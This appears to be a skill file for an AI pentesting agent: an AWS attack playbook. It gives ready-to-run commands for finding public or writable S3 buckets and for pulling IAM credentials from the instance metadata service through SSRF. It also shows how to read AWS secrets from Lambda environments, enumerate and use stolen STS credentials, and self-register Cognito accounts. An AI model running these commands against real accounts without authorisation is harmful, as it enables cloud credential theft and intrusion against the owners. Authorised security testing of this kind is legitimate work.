---
name: aws-security
description: AWS cloud security testing covering S3 misconfiguration, IAM abuse, Lambda SSRF, IMDSv1/v2 exploitation, and STS token theft
---

# AWS Security Testing

## Key Vulnerabilities

### S3 Bucket Misconfiguration

```bash
# Test public access
for bucket in TARGET TARGET-assets TARGET-backup TARGET-dev TARGET-staging TARGET-data; do
  aws s3 ls s3://$bucket --no-sign-request 2>/dev/null && echo "[VULN] $bucket is public!"
  curl -sk "https://$bucket.s3.amazonaws.com/" | grep -i "listbucket" && echo "[VULN] $bucket listing enabled!"
done

# Test write access
echo "test" > /tmp/test.txt
aws s3 cp /tmp/test.txt s3://TARGET/test-xalgorix.txt --no-sign-request 2>/dev/null && echo "[VULN] Public write!"
```

### IMDS Exploitation (Metadata Service)

```bash
# IMDSv1 — simple GET request (via SSRF)
curl -s http://169.254.169.254/latest/meta-data/
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
curl -s http://169.254.169.254/latest/user-data/

# IMDSv2 — requires token (but SSRF may still work if server follows redirects)
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/

# IMDSv2 bypass via SSRF with redirect
# If SSRF follows 301/302, redirect to IMDS with PUT method token generation
```

### Lambda Function Exploitation

```bash
# Lambda environment variables contain secrets
# Via SSRF: file:///proc/self/environ → AWS_SECRET_ACCESS_KEY, AWS_SESSION_TOKEN
# Via RCE: env | grep AWS

# Lambda runtime API
curl -s http://localhost:9001/2018-06-01/runtime/invocation/next
```

### STS Token Abuse

```bash
# Use stolen credentials
export AWS_ACCESS_KEY_ID="AKIA..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_SESSION_TOKEN="..."

# Enumerate identity
aws sts get-caller-identity
# Enumerate permissions
aws iam list-attached-user-policies --user-name $(aws sts get-caller-identity --query Arn --output text | cut -d/ -f2)
# Try S3, Lambda, EC2 access
aws s3 ls
aws lambda list-functions
aws ec2 describe-instances
```

### Cognito Misconfiguration

```bash
# Self-registration on user pools
aws cognito-idp sign-up --client-id CLIENT_ID --username attacker --password P@ssw0rd! --region us-east-1
# Get identity credentials from identity pool
aws cognito-identity get-id --identity-pool-id POOL_ID --region us-east-1
```

## Pro Tips

1. S3 bucket names follow patterns — test TARGET, TARGET-prod, TARGET-dev, TARGET-assets, TARGET-backup
2. IMDSv1 is the #1 SSRF target — always test `169.254.169.254` via any SSRF vector
3. IMDSv2 can be bypassed if SSRF allows custom headers (PUT + X-aws-ec2-metadata-token-ttl-seconds)
4. Lambda function environment variables are the most reliable source of AWS credentials via SSRF
5. Use `enumerate-iam` tool to discover all permissions of stolen credentials
